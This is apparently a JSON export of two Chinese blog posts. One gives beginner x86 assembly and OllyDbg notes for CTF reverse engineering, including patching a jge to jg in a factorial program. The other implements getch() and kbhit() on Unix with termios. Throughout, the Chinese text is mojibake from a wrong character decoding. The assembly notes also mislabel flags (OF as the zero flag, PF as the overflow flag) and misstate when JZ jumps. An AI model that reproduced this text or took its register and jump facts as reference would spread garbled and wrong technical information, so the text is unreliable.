ä»¥åŠODçš„ä½¿ç”¨ã€‚","text":"åŸºç¡€æ±‡ç¼–çŸ¥è¯†ä»¥åŠODçš„ä½¿ç”¨ã€‚ æ•°å€¼è¡¨ç¤ºäºŒè¿›åˆ¶-bï¼ˆbinaryï¼‰ã€åè¿›åˆ¶-dï¼ˆdecimalismï¼‰ã€åå…­è¿›åˆ¶-hï¼ˆhexadecimalï¼‰ å­—é•¿ï¼š bitï¼šä½ byteï¼šå­—èŠ‚â€“1byte=8bit wordï¼šå­—â€“1word=2byte=16bit dwordï¼šåŒå­—â€“1dword=2word=4byte=32bit qwordï¼šå››å­—â€“1qword=2dword=4word=8byte=64bit é€šç”¨å¯„å­˜å™¨ EAXï¼šç´¯åŠ å™¨ï¼ˆaccumulatorï¼‰ï¼Œæ˜¯åŠ æ³•ä¹˜æ³•æŒ‡ä»¤çš„ç¼ºçœå¯„å­˜å™¨ã€‚è¿˜å¯ä»¥ç”¨æ¥å­˜å‚¨å‡½æ•°è¿”å›å€¼ ECXï¼šé‡å¤REPå’ŒLOOPæŒ‡ä»¤çš„è®¡æ•°å™¨ï¼ˆcounterï¼‰ EDXï¼šç”¨äºå­˜æ”¾æ•´æ•°é™¤æ³•äº§ç”Ÿçš„ä½™æ•° EBXï¼šåœ¨å†…å­˜å¯»å€æ—¶ç”¨æ¥å­˜æ”¾åŸºåœ°å€ï¼ˆbaseï¼‰ ESPï¼šå½“å‰çº¿ç¨‹çš„æ ˆé¡¶æŒ‡é’ˆï¼Œå‹å…¥æ ˆçš„æ•°æ®è¶Šå¤šï¼ŒESPè¶Šå°ï¼Œæ¯å…¥æ ˆä¸€æ¬¡å‡å°4å­—èŠ‚ EBPï¼šå½“å‰çº¿ç¨‹çš„æ ˆåº•æŒ‡é’ˆ ESI/EDIï¼šæº/ç›®æ ‡ç´¢å¼•å¯„å­˜å™¨ï¼Œå­—ç¬¦ä¸²æ“ä½œä¸­ï¼ŒDS:ESIæŒ‡å‘æºä¸²ï¼ŒES:EDIæŒ‡å‘ç›®æ ‡ä¸²ã€‚ EIPï¼šå­˜æ”¾ä¸‹ä¸€ä¸ªCPUæŒ‡ä»¤çš„å†…å­˜åœ°å€ï¼Œæ‰§è¡Œå®Œåè¯»å–ä¸‹ä¸€æŒ‡ä»¤ æ ‡å¿—å¯„å­˜å™¨ CFï¼šè¿›ä½æ ‡å¿—ï¼ˆå¯æ£€æŸ¥æ— ç¬¦å·æ“ä½œæ˜¯å¦æº¢å‡ºï¼‰ OFï¼šé›¶æ ‡å¿— SFï¼šç¬¦å·æ ‡å¿— PFï¼šæº¢å‡ºæ ‡å¿—ï¼ˆè¡¥ç æº¢å‡ºï¼‰ å¯„å­˜å™¨å¯»å€ ç«‹å³æ•°å¯»å€ï¼šMOV EAX, 123H å¯„å­˜å™¨å¯»å€ï¼šMOV EAX, EBXï¼ˆEBXä¸­å­˜æ”¾æ“ä½œæ•°ï¼‰ ç›´æ¥å¯»å€ï¼šMOV EAX, [12345678H]ï¼ˆæ“ä½œæ•°ä»¥[]ä¸ºåœ°å€ï¼‰ å¯„å­˜å™¨é—´æ¥å¯»å€ï¼šMOV EAX, [EBX]ï¼ˆæ“ä½œæ•°çš„åœ°å€ä¸ºEBXä¸­å­˜å‚¨çš„å€¼ï¼‰ åŸºæœ¬æ±‡ç¼–æŒ‡ä»¤æ•°æ®ä¼ è¾“ æŒ‡ä»¤ ä½œç”¨ MOV èµ‹å€¼ PUSH å…¥æ ˆ POP å‡ºæ ˆ LEA å–åœ°å€ MOVSX ç¬¦å·ä¼ é€ PUSHAD å°†æ‰€æœ‰32ä½é€šç”¨å¯„å­˜å™¨å‹å…¥æ ˆ POPAD å°†æ‰€æœ‰32ä½é€šç”¨å¯„å­˜å™¨å–å‡ºæ ˆ ç®—æœ¯è¿ç®— æŒ‡ä»¤ ä½œç”¨ ADD åŠ æ³• INC è‡ªåŠ  SUB å‡æ³• DEC è‡ªå‡ CMP æ¯”è¾ƒ MUL ä¹˜æ³• DIV é™¤æ³• IDIV ç¬¦å·æ•´é™¤ IMUL ç¬¦å·ä¹˜æ³• NEG æ±‚è¡¥ é€»è¾‘è¿ç®— æŒ‡ä»¤ ä½œç”¨ AND ä¸è¿ç®— OR æˆ–è¿ç®— NOT éè¿ç®— XOR å¼‚æˆ–è¿ç®— TEST ä¸è¿ç®—ï¼ˆåªå¯¹æ ‡å¿—ä½ä¿®æ”¹ï¼Œå¯¹æ“ä½œæ•°æ²¡æœ‰å½±å“ï¼‰ SHL é€»è¾‘å·¦ç§» SAL ç®—æœ¯å·¦ç§» SHR é€»è¾‘å³ç§» SAR ç®—æœ¯å³ç§» ROL å¾ªç¯å·¦ç§» ROR å¾ªç¯å³ç§» RCL è¿›ä½å¾ªç¯å·¦ç§» RCR è¿›ä½å¾ªç¯å³ç§» è½¬ç§»æŒ‡ä»¤ æŒ‡ä»¤ ä½œç”¨ JMP è·³è½¬ JA å¤§äºæ—¶è·³è½¬ï¼ˆ&gt;ï¼‰ JNA ä¸å¤§äºæ—¶è·³è½¬ï¼ˆ&lt;=ï¼‰ JAE å¤§äºç­‰äºæ—¶è·³è½¬ï¼ˆ&gt;=ï¼‰ JB å°äºæ—¶è·³è½¬ï¼ˆ&lt;ï¼‰ JNB ä¸å°äºæ—¶è·³è½¬ï¼ˆ&gt;=ï¼‰ JBE å°äºç­‰äºæ—¶è·³è½¬ï¼ˆ&lt;=ï¼‰ JE ç›¸ç­‰æ—¶è·³è½¬ï¼ˆ==ï¼‰ JNE ä¸ç­‰äºæ—¶è·³è½¬ï¼ˆ!=ï¼‰ JNBE ä¸å°äºç­‰äºæ—¶è·³è½¬ï¼ˆ&gt;ï¼‰ JG å¤§äºæ—¶è·³è½¬ï¼ˆæœ‰ç¬¦å·ï¼‰ï¼ˆ&gt;ï¼‰ JNG ä¸å¤§äºæ—¶è·³è½¬ï¼ˆæœ‰ç¬¦å·ï¼‰ï¼ˆ&lt;=ï¼‰ JGE å¤§äºç­‰äºæ—¶è·³è½¬ï¼ˆæœ‰ç¬¦å·ï¼‰ï¼ˆ&gt;=ï¼‰ JL å°äºæ—¶è·³è½¬ï¼ˆæœ‰ç¬¦å·ï¼‰ï¼ˆ&lt;ï¼‰ JNL ä¸å°äºæ—¶è·³è½¬ï¼ˆæœ‰ç¬¦å·ï¼‰ï¼ˆ&gt;=ï¼‰ JLE å°äºç­‰äºæ—¶è·³è½¬ï¼ˆæœ‰ç¬¦å·ï¼‰ï¼ˆ&lt;=ï¼‰ JNGE ä¸å¤§äºç­‰äºæ—¶è·³è½¬ï¼ˆæœ‰ç¬¦å·ï¼‰ï¼ˆ&lt;ï¼‰ JNLE ä¸å°äºç­‰äºæ—¶è·³è½¬ï¼ˆæœ‰ç¬¦å·ï¼‰ï¼ˆ&gt;ï¼‰ JZ ZFä¸º0æ—¶è·³è½¬ JNZ ZFä¸ä¸º0æ—¶è·³è½¬ JS æœ‰ç¬¦å·æ—¶è·³è½¬ JNS æ— ç¬¦å·æ—¶è·³è½¬ JGEï¼šJump if Greater or Equal å¾ªç¯æŒ‡ä»¤ æŒ‡ä»¤ ä½œç”¨ LOOP å¾ªç¯ï¼ˆæ”¹å˜ECXçš„å€¼ï¼‰ JCXZ å¾ªç¯ï¼ˆä¸æ”¹å˜ECXçš„å€¼ï¼‰ ä¸²æŒ‡ä»¤ æŒ‡ä»¤ ä½œç”¨ MOVS[B/W/D] ä¼ é€å­—èŠ‚ä¸²/å­—ä¸²/åŒå­—ä¸² CMPS[B/W/D] æ¯”è¾ƒå­—èŠ‚ä¸²/å­—ä¸²/åŒå­—ä¸² SCAS[B/W/D] æ‰«æå­—èŠ‚ä¸²/å­—ä¸²/åŒå­—ä¸² LODS[B/W/D] åŠ è½½æºå˜å€å­—èŠ‚ä¸²/å­—ä¸²/åŒå­—ä¸² STOS[B/W/D] ä¿å­˜å­—èŠ‚ä¸²/å­—ä¸²/åŒå­—ä¸² REP é‡å¤ å…¶ä»–æŒ‡ä»¤ æŒ‡ä»¤ ä½œç”¨ INT ç»ˆæ­¢ç¨‹åº CALL è°ƒç”¨å‡½æ•° RET è¿‡ç¨‹è¿”å› NOP ç©º CLD æ–¹å‘æ¸…é›¶ ODåˆæ¢é™æ€è°ƒè¯•ä¸åŠ¨æ€è°ƒè¯•ï¼šé™æ€è°ƒè¯•å°±æ˜¯åœ¨ä¸æ‰§è¡Œç¨‹åºçš„æƒ…å†µä¸‹ï¼Œäººå·¥åœ°å¯¹æºä»£ç çš„è¯­æ³•å’Œé€»è¾‘åˆ†æï¼›åŠ¨æ€è°ƒè¯•åˆ™æ˜¯åœ¨ç¼–è¯‘ã€é“¾æ¥ã€è¿è¡Œçš„æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œè§‚å¯Ÿå¦‚å¯„å­˜å™¨å†…å®¹ã€å‡½æ•°æ‰§è¡Œæƒ…å†µç­‰çŠ¶æ€æ¥åˆ†æè°ƒè¯• L(og):æ—¥å¿—ä¿¡æ¯ E(xecute modules):æ¨¡å—ä¿¡æ¯ M(emory map):å†…å­˜æ˜ å°„ä¿¡æ¯ T(hreads):çº¿ç¨‹ä¿¡æ¯ W(indows):çª—å£ä¿¡æ¯ H(andles):å¥æŸ„ä¿¡æ¯ C:å½“å‰çº¿ç¨‹ä¸Šä¸‹æ–‡ K:è°ƒç”¨é“¾ä¿¡æ¯ â€¦â€¦ ODè°ƒè¯•å¿«æ·é”® å¿«æ·é”® åŠŸèƒ½ ctrl+g è·³è½¬åˆ°æŒ‡å®šä½ç½® ctrl+e ç¼–è¾‘æŒ‡å®šåŒºåŸŸ space ç¼–è¾‘æ±‡ç¼–ä»£ç  f4 æ‰§è¡Œåˆ°å…‰æ ‡ä½ç½®å¤„ f2 æ–­ç‚¹ï¼ˆInt3ï¼‰ ; æ·»åŠ æ³¨é‡Š : æ·»åŠ æ ‡ç­¾å * è¿”å›åˆ°æ­£åœ¨è¿è¡Œçš„åœ°æ–¹ -(+) è¿”å›åˆ°ä¸Šï¼ˆä¸‹ï¼‰ä¸€ä¸ªå…‰æ ‡å¤„ enter è·Ÿéšè·³è½¬/è·Ÿå…¥è°ƒç”¨å†…éƒ¨ f3 æ‰“å¼€ä¸€ä¸ªæ–°çš„å¯æ‰§è¡Œç¨‹åº ctrl+f2 é‡æ–°è¿è¡Œå½“å‰è°ƒè¯•çš„ç¨‹åº f9 è¿è¡Œé€‰å®šçš„ç¨‹åºè¿›è¡Œè°ƒè¯• f12 æš‚æ—¶åœæ­¢è¢«è°ƒè¯•ç¨‹åºçš„æ‰§è¡Œ f7 å•æ­¥è¿›å…¥è¢«è°ƒè¯•ç¨‹åºçš„callä¸­ f8 æ­¥è¿‡è¢«è°ƒè¯•ç¨‹åºçš„call ctrl+f9 æ‰§è¡Œç›´åˆ°è¿”å› ç¬¬ä¸€æ¬¡è°ƒè¯•ï¼ˆhelloworld.exeï¼‰å…³äºPEæ–‡ä»¶çš„EntryPointã€‚æ‰“å¼€CFFï¼Œå°†PEæ–‡ä»¶æ‹–å…¥ï¼š å…¶ä¸­ï¼ŒImageBaseå’ŒAddressOfEntryPointæŒ‡å‘çš„åœ°å€å³ä¸ºEntryPoint æ‰¾åˆ°mainå‡½æ•° ä»£ç æ‰§è¡Œï¼šé€šè¿‡F7å•æ­¥æ­¥å…¥ï¼Œä¸€æ­¥ä¸€æ­¥æ‰§è¡Œåˆ°å¼¹æ¡†è·³å‡ºæ—¶ï¼Œè¿›å…¥mainå‡½æ•° å±‚å±‚æ¨è¿›ï¼šé€šè¿‡F8å•æ­¥æ­¥è¿‡ï¼Œå¿«é€Ÿè·³è¿‡æ¯ä¸ªå‡½æ•°ï¼Œè·³å‡ºå¼¹æ¡†åï¼Œè¿›å…¥mainå‡½æ•° å­—ç¬¦ä¸²æ£€ç´¢ï¼šæ ¹æ®å¼¹æ¡†ä¸Šæ–¹çš„å­—ç¬¦ä¸²ï¼Œå³é”®æ™ºèƒ½æœç´¢æŸ¥æ‰¾ï¼Œæ‰¾åˆ°åç›´æ¥è¿›å…¥mainå‡½æ•° APIæ£€ç´¢æ³•ï¼šé€šè¿‡è¿è¡Œç¨‹åºå¯ä»¥åˆ¤æ–­æ–‡ä»¶å¥æŸ„æ˜¯MessageBoxï¼Œåœ¨æ¨¡å—ä¸­æ‰¾åˆ°åä¾æ¬¡è®¾ç½®æ–­ç‚¹ï¼Œè¿è¡Œç¨‹åºï¼Œåœ¨ä¸»å‡½æ•°æ–­ç”µå¤„åœä¸‹ ç‰¹å¾æ³•ï¼šæ ¹æ®Cè¯­è¨€çš„åæ±‡ç¼–ç‰¹å¾è¿›è¡Œåˆ¤æ–­ ä¿®æ”¹å†…å®¹ Fact.exe jgeè¡¨ç¤ºå¤§äºæˆ–ç­‰äºæ—¶è·³è½¬ã€‚å½“è¾“å…¥æ•°å­—næ—¶ï¼ŒEDXå­˜æ”¾å€¼nï¼ŒECXä¸­çš„å€¼åˆå§‹åŒ–ä¸º1ï¼Œ[local.3]ä¸­çš„å€¼ä¹Ÿä¸º1ï¼Œæ¯æ¬¡å¾ªç¯æ—¶ï¼ŒECXä¸­çš„å€¼è‡ªåŠ ä¸€ï¼Œ[local.3]çš„å€¼ä¸ºè‡ªèº«å†ä¹˜ä¸ŠECXä¸­çš„å€¼ã€‚å½“ECXç­‰äºEDXæ—¶è·³å‡ºå¾ªç¯ï¼Œè€Œä¸å†è¿›è¡Œä¸‹ä¸€æ¬¡ä¹˜æ³•ï¼Œæœ€å[local.3]ä¸­çš„å€¼ä¸º(n-1)!ï¼Œæ•…åº”è¯¥å°†jgeä¿®æ”¹ä¸ºjgå³å¯ å‚è€ƒç½‘ç«™https://www.cnblogs.com/qq78292959/archive/2012/07/20/2600865.htmlhttps://blog.csdn.net/qq_34717555/article/details/77727176https://blog.csdn.net/hanchaoman/article/details/9187093","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"Unix/Linuxä¸‹å®ç°Windowsä¸­conio.hå¤´æ–‡ä»¶éƒ¨åˆ†å‡½æ•°","slug":"Unix-Linuxä¸‹å®ç°Windowsä¸­conio-hå¤´æ–‡ä»¶éƒ¨åˆ†å‡½æ•°","date":"2018-06-19T13:38:18.000Z","updated":"2018-06-19T14:09:32.051Z","comments":true,"path":"2018/06/19/Unix-Linuxä¸‹å®ç°Windowsä¸­conio-hå¤´æ–‡ä»¶éƒ¨åˆ†å‡½æ•°/","link":"","permalink":"https://qianfei11.github.io/2018/06/19/Unix-Linuxä¸‹å®ç°Windowsä¸­conio-hå¤´æ–‡ä»¶éƒ¨åˆ†å‡½æ•°/","excerpt":"æœ€è¿‘åœ¨å†™æ•°æ®ç»“æ„å¤§ä½œä¸šï¼Œå› ä¸ºåœ¨å†™äº”å­æ£‹çš„æ—¶å€™ä¸çŸ¥é“æ€ä¹ˆå®ç°é€šè¿‡é”®ç›˜æ¥å®ç°ç§»åŠ¨å’Œä¸‹å­ï¼Œäº†è§£åˆ°äº†windowsä¸‹çš„conio.hå¤´æ–‡ä»¶ã€‚ä½†æ˜¯ç”±äºæˆ‘ç”¨çš„æ˜¯unixç³»ç»Ÿï¼Œéœ€è¦è‡ªå·±æ¥å®ç°ã€‚","text":"æœ€è¿‘åœ¨å†™æ•°æ®ç»“æ„å¤§ä½œä¸šï¼Œå› ä¸ºåœ¨å†™äº”å­æ£‹çš„æ—¶å€™ä¸çŸ¥é“æ€ä¹ˆå®ç°é€šè¿‡é”®ç›˜æ¥å®ç°ç§»åŠ¨å’Œä¸‹å­ï¼Œäº†è§£åˆ°äº†windowsä¸‹çš„conio.hå¤´æ–‡ä»¶ã€‚ä½†æ˜¯ç”±äºæˆ‘ç”¨çš„æ˜¯unixç³»ç»Ÿï¼Œéœ€è¦è‡ªå·±æ¥å®ç°ã€‚ ä¸»è¦å®ç°getch()å’Œkbhit()ä¸¤ä¸ªå‡½æ•°ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;termios.h&gt; //Linuxä¸“ç”¨å¤´æ–‡ä»¶ï¼Œç”¨äºå®ç°getch()ã€kbhit()#include &lt;unistd.h&gt; //å®šä¹‰äº†å¤§é‡é’ˆå¯¹ç³»ç»Ÿè°ƒç”¨çš„å°è£…çš„æ¥å£ æä¾›å¯¹ POSIX æ“ä½œç³»ç»Ÿ API çš„è®¿é—®åŠŸèƒ½#include &lt;fcntl.h&gt; //å®šä¹‰äº†å¾ˆå¤šå®å’Œå‡½æ•°åŸå‹ å¯¹æ–‡ä»¶çš„æ‰“å¼€ã€æ•°æ®å†™å…¥ã€æ•°æ®è¯»å–ã€å…³é—­æ–‡ä»¶çš„æ“ä½œ#include &lt;stdio.h&gt;int getch() //è¾“å…¥ä¸éœ€è¦å›è½¦é”®ä¾¿è¿”å›&#123; struct termios tm, tm_old; if(tcgetattr(STDIN_FILENO, &amp;tm) &lt; 0) //STDIN_FILENOæ˜¯ç»ˆç«¯æ–‡ä»¶æè¿°ç¬¦ï¼Œæ˜¯ä¸€ä¸ªæ‰“å¼€æ–‡ä»¶å¥æŸ„ return -1; tm_old = tm; cfmakeraw(&amp;tm); //è®¾ç½®ä¸²å£å±æ€§ å°†ç»ˆç«¯è®¾ç½®æˆåŸå§‹æ¨¡å¼ï¼Œæ­¤æ—¶ç»ˆç«¯æ˜¯ä¸å¯å›æ˜¾çš„ if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm) &lt; 0) //æ›´æ”¹ç»ˆç«¯è®¾ç½® return -1; int ch = getchar(); if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm_old) &lt; 0) //æ¢å¤ç»ˆç«¯åŸå§‹è®¾ç½® return -1; return ch;&#125;int kbhit() //æ£€æµ‹é”®ç›˜æ˜¯å¦æœ‰è¾“å…¥&#123; struct termios oldt, newt; //æ§åˆ¶ç»ˆç«¯çŠ¶æ€çš„æ•°æ®ç»“æ„ int ch; int oldf; tcgetattr(STDIN_FILENO, &amp;oldt); //å¾—åˆ°å½“å‰ç»ˆç«¯çš„çŠ¶æ€ newt = oldt; //è®¾ç½®æ–°çš„ç»ˆç«¯å±æ€§ï¼šICANONå’ŒECHOå–åï¼Œè¡¨ç¤ºå…³é—­è¾“å…¥è¡Œç¼–è¾‘æ¨¡å¼ï¼Œå³èƒ½å¤Ÿç›´æ¥è¯»å…¥å­—ç¬¦ newt.c_lflag &amp;= ~(ICANON | ECHO); //ICANONï¼šå¦‚æœåœ¨è¾“å…¥ä¸­çœ‹åˆ°&apos;\\n&apos;æˆ–è€…&apos;EOF&apos;ï¼Œä¼šè¿”å›ç¼“å†²åŒºå†…å®¹ //ECHOï¼šæ§åˆ¶å›æ˜¾ tcsetattr(STDIN_FILENO, TCSANOW, &amp;newt); //TSCSANOWï¼šå‘Šè¯‰å‡½æ•°ç«‹å³æ”¹å˜ç»ˆç«¯çš„STDIN_FILENOçš„å±æ€§å€¼ oldf = fcntl(STDIN_FILENO, F_GETFL, 0); //è·å–flagsï¼Œå³openå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•° //fcntl()çš„è¿”å›å€¼ä¸å‘½ä»¤æœ‰å…³ã€‚å¦‚æœå‡ºé”™ï¼Œæ‰€æœ‰å‘½ä»¤éƒ½è¿”å›ï¼1ï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›æŸä¸ªå…¶ä»–å€¼ fcntl(STDIN_FILENO, F_SETFL, oldf | O_NONBLOCK); //å¢åŠ ä¸€ä¸ªflagsï¼ŒæŠŠæ–‡ä»¶è®¾ç½®æˆéé˜»å¡ //F_SETFLè®¾ç½®æ–‡ä»¶çŠ¶æ€æ ‡è®° ch = getchar(); tcsetattr(STDIN_FILENO, TCSANOW, &amp;oldt); //æ¢å¤ç»ˆç«¯è®¾ç½® fcntl(STDIN_FILENO, F_SETFL, oldf); if(ch != EOF) &#123; ungetc(ch, stdin); //æŠŠå­—ç¬¦é€€å›åˆ°è¾“å…¥æµ return 1; &#125; return 0;&#125; getch()1234567891011121314int getch() //è¾“å…¥ä¸éœ€è¦å›è½¦é”®ä¾¿è¿”å›&#123; struct termios tm, tm_old; if(tcgetattr(STDIN_FILENO, &amp;tm) &lt; 0) //STDIN_FILENOæ˜¯ç»ˆç«¯æ–‡ä»¶æè¿°ç¬¦ï¼Œæ˜¯ä¸€ä¸ªæ‰“å¼€æ–‡ä»¶å¥æŸ„ return -1; tm_old = tm; cfmakeraw(&amp;tm); //è®¾ç½®ä¸²å£å±æ€§ å°†ç»ˆç«¯è®¾ç½®æˆåŸå§‹æ¨¡å¼ï¼Œæ­¤æ—¶ç»ˆç«¯æ˜¯ä¸å¯å›æ˜¾çš„ if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm) &lt; 0) //æ›´æ”¹ç»ˆç«¯è®¾ç½® return -1; int ch = getchar(); if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm_old) &lt; 0) //æ¢å¤ç»ˆç«¯åŸå§‹è®¾ç½® return -1; return ch;&#125; termiosç»“æ„ä½“1234567struct termios&#123; tcflag_t c_iflag; /* Input modes */ tcflag_t c_oflag; /* Output modes */ tcflag_t c_cflag; /* Control modes */ tcflag_t c_lflag; /* Local modes */ cc_t c_cc[NCCS]; /* Control characters */&#125;; æ ¼å­—æ®µçš„é€‰é¡¹å¦‚ä¸‹ï¼š c_iflag é”®å€¼ è¯´æ˜ BRKINT æ¥åˆ°BREAKæ—¶äº§ç”ŸSIGINTï¼› ICRNL å°†è¾“å…¥çš„CRè½¬æ¢ä¸ºNLï¼› IGNBRK å¿½ç•¥BREAKæ¡ä»¶ï¼› IGNCR å¿½ç•¥CRï¼› IGNPAR å¿½ç•¥å¥‡å¶é”™å­—ç¬¦ï¼› IMAXBEL åœ¨è¾“å…¥é˜Ÿåˆ—ç©ºæ—¶æŒ¯é“ƒï¼› INLCR å°†è¾“å…¥çš„NLè½¬æ¢ä¸ºCRï¼› INPCK æ‰“å¼€è¾“å…¥å¥‡å¶æ ¡éªŒï¼› ISTRIP å‰¥é™¤è¾“å…¥å­—ç¬¦çš„ç¬¬8ä½ï¼› IUCLC å°†è¾“å…¥çš„å¤§å†™å­—ç¬¦è½¬æ¢æˆå°å†™å­—ç¬¦(ä»…SVR4)ï¼› IXANY ä½¿ä»»ä¸€å­—ç¬¦éƒ½é‡æ–°èµ·åŠ¨è¾“å‡ºï¼› IXOFF ä½¿èµ·åŠ¨/åœæ­¢è¾“å…¥æ§åˆ¶æµèµ·ä½œç”¨ï¼› IXON ä½¿èµ·åŠ¨/åœæ­¢è¾“å‡ºæ§åˆ¶æµèµ·ä½œç”¨ï¼› PARMRK æ ‡è®°å¥‡å¶é”™ï¼› c_oflag é”®å€¼ è¯´æ˜ BSDLY é€€æ ¼å»¶è¿Ÿå±è”½(ä»…SVR4)ï¼› CRDLY CRå»¶è¿Ÿå±è”½(ä»…SVR4)ï¼› FFDLY æ¢é¡µå»¶è¿Ÿå±è”½(ä»…SVR4)ï¼› NLDLY NLå»¶è¿Ÿå±è”½(ä»…SVR4)ï¼› OCRNL å°†è¾“å‡ºçš„CRè½¬æ¢ä¸ºNL(ä»…SVR4)ï¼› OFDEL å¡«å……ç¬¦ä¸ºDELï¼Œå¦åˆ™ä¸ºNUL(ä»…SVR4)ï¼› OFILL å¯¹äºå»¶è¿Ÿä½¿ç”¨å¡«å……ç¬¦(ä»…SVR4)ï¼› OLCUC å°†è¾“å‡ºçš„å°å†™å­—ç¬¦è½¬æ¢ä¸ºå¤§å†™å­—ç¬¦(ä»…SVR4)ï¼› ONLCR å°†NLè½¬æ¢ä¸ºCR-NLï¼› ONLRET NLæ‰§è¡ŒCRåŠŸèƒ½(ä»…SVR4)ï¼› ONOCR åœ¨0åˆ—ä¸è¾“å‡ºCR(ä»…SVR4)ï¼› ONOEOT åœ¨è¾“å‡ºä¸­åˆ é™¤EOTå­—ç¬¦(ä»…4.3+BSD)ï¼› OPOST æ‰§è¡Œè¾“å‡ºå¤„ç†ï¼› OXTABS å°†åˆ¶è¡¨ç¬¦æ‰©å……ä¸ºç©ºæ ¼(ä»…4.3+BSD)ï¼› TABDLY æ°´å¹³åˆ¶è¡¨ç¬¦å»¶è¿Ÿå±è”½(ä»…SVR4)ï¼› VTDLY å‚ç›´åˆ¶è¡¨ç¬¦å»¶è¿Ÿå±è”½(ä»…SVR4)ï¼› c_cflag é”®å€¼ è¯´æ˜ CCTS_OFLOW è¾“å‡ºçš„CTSæµæ§åˆ¶(ä»…4.3+BSD)ï¼› CIGNORE å¿½ç•¥æ§åˆ¶æ ‡å¿—(ä»…4.3+BSD)ï¼› CLOCAL å¿½ç•¥è§£åˆ¶è§£è°ƒå™¨çŠ¶æ€è¡Œï¼› CREAD å¯ç”¨æ¥æ”¶è£…ç½®ï¼› CRTS_IFLOW è¾“å…¥çš„RTSæµæ§åˆ¶(ä»…4.3+BSD)ï¼› CSIZE å­—ç¬¦å¤§å°å±è”½ï¼› CSTOPB é€ä¸¤ä¸ªåœæ­¢ä½ï¼Œå¦åˆ™ä¸º1ä½ï¼› HUPCL æœ€åå…³é—­æ—¶æ–­å¼€ï¼› MDMBUF ç»è½½æ³¢çš„æµæ§è¾“å‡º(ä»…4.3+BSD)ï¼› PARENB è¿›è¡Œå¥‡å¶æ ¡ï¼› PARODD å¥‡æ ¡ï¼Œå¦åˆ™ä¸ºå¶æ ¡ï¼› c_lflag é”®å€¼ è¯´æ˜ ALTWERASE ä½¿ç”¨æ›¿æ¢WERASEç®—æ³•(ä»…4.3+BSD)ï¼› ECHO è¿›è¡Œå›é€ï¼› ECHOCTL å›é€æ§åˆ¶å­—ç¬¦ä¸º^(char)ï¼› ECHOE å¯è§æ“¦é™¤ç¬¦ï¼› ECHOK å›é€killç¬¦ï¼› ECHOKE killçš„å¯è§æ“¦é™¤ï¼› ECHONL å›é€NLï¼› ECHOPRT ç¡¬æ‹·è´çš„å¯è§æ“¦é™¤æ–¹å¼ï¼› FLUSHO åˆ·æ¸…è¾“å‡ºï¼› ICANON è§„èŒƒè¾“å…¥ï¼› IEXTEN ä½¿æ‰©å……çš„è¾“å…¥å­—ç¬¦å¤„ç†èµ·ä½œç”¨ï¼› ISIG ä½¿ç»ˆç«¯äº§ç”Ÿçš„ä¿¡å·èµ·ä½œç”¨ï¼› NOFLSH åœ¨ä¸­æ–­æˆ–é€€å‡ºé”®åä¸åˆ·æ¸…ï¼› NOKERNINFO STATUSä¸ä½¿å†…æ ¸è¾“å‡º(ä»…4.3+BSD)ï¼› PENDIN é‡æ–°æ‰“å°ï¼› TOSTOP å¯¹äºåå°è¾“å‡ºå‘é€SIGTTOUï¼› XCASE è§„èŒƒå¤§/å°å†™è¡¨ç¤º(ä»…SVR4)ï¼› å„æ ‡å¿—çš„å«ä¹‰å¦‚ä¸‹ï¼š æ ‡å¿— å«ä¹‰ ALTWERASE (c_lflag, 4.3+BSD)æ­¤æ ‡å¿—è®¾ç½®æ—¶ï¼Œè‹¥è¾“å…¥äº†WERASEå­—ç¬¦ï¼Œåˆ™ä½¿ç”¨ä¸€ä¸ªæ›¿æ¢çš„å­—æ“¦é™¤ç®—æ³•ã€‚å®ƒä¸æ˜¯å‘åç§»åŠ¨åˆ°å‰ä¸€ä¸ªç™½ç©ºå­—ç¬¦ä¸ºæ­¢ï¼Œè€Œæ˜¯å‘åç§»åŠ¨åˆ°ç¬¬ä¸€ä¸ªéå­—æ¯ã€æ•°å­—ç¬¦ä¸ºæ­¢ã€‚ BRKINT (c_iflag, POSIX.1)è‹¥æ­¤æ ‡å¿—è®¾ç½®ï¼Œè€ŒIGNBRKæœªè®¾ç½®ï¼Œåˆ™åœ¨æ¥åˆ°BREAKæ—¶ï¼Œè¾“å…¥ã€è¾“å‡ºé˜Ÿåˆ—è¢«åˆ·æ¸…ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªSIGINTä¿¡å·ã€‚å¦‚æœæ­¤ç»ˆç«¯è®¾å¤‡æ˜¯ä¸€ä¸ªæ§åˆ¶ç»ˆç«¯ï¼Œåˆ™å°†æ­¤ä¿¡å·é€ç»™å‰å°è¿›ç¨‹ç»„å„è¿›ç¨‹ã€‚å¦‚æœIGNBRKå’ŒBRKINTéƒ½æ²¡æœ‰è®¾ç½®ï¼Œä½†æ˜¯è®¾ç½®äº†PARMRKï¼Œåˆ™BREAKè¢«è¯»ä½œä¸ºä¸‰ä¸ªå­—èŠ‚åºåˆ—/377ï¼Œ/0å’Œ/0ï¼Œå¦‚æœPARMRKä¹Ÿæ²¡æœ‰è®¾ç½®ï¼Œåˆ™BREAKè¢«è¯»ä½œä¸ºå•ä¸ªå­—ç¬¦/0ã€‚ BSDLY (c_oflag, SVR4)é€€æ ¼å»¶è¿Ÿå±è”½ï¼Œæ­¤å±è”½çš„å€¼æ˜¯BS0æˆ–BS1ã€‚ CCTS_OFLOW (c_cflag, 4.3+BSD)è¾“å‡ºçš„CTSæµæ§åˆ¶ã€‚ CIGNORE (c_cflag, 4.3+BSD)å¿½ç•¥æ§åˆ¶æ ‡å¿—ã€‚ CLOCAL (c_cflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™å¿½ç•¥è°ƒåˆ¶è§£è°ƒå™¨çŠ¶æ€çº¿ã€‚è¿™é€šå¸¸æ„å‘³ç€è¯¥è®¾å¤‡æ˜¯æœ¬åœ°è¿æ¥çš„ã€‚è‹¥æ­¤æ 